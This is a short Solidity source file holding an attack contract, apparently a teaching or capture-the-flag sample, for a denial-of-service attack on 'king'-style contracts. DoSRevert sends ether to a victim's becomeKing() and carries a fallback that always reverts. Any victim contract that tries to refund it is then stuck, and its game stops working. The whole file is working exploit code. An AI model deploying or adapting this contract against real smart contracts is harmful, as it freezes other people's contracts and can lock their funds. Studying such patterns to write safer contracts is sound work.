pragma solidity ^0.4.19;

contract DoSRevert {
  function becomeKing(address victim) payable {
    Victim _victim = Victim(victim);
    _victim.becomeKing.value(msg.value)();
  }

  function () payable {
    revert();
  }
}

contract Victim {
  function becomeKing() payable;
}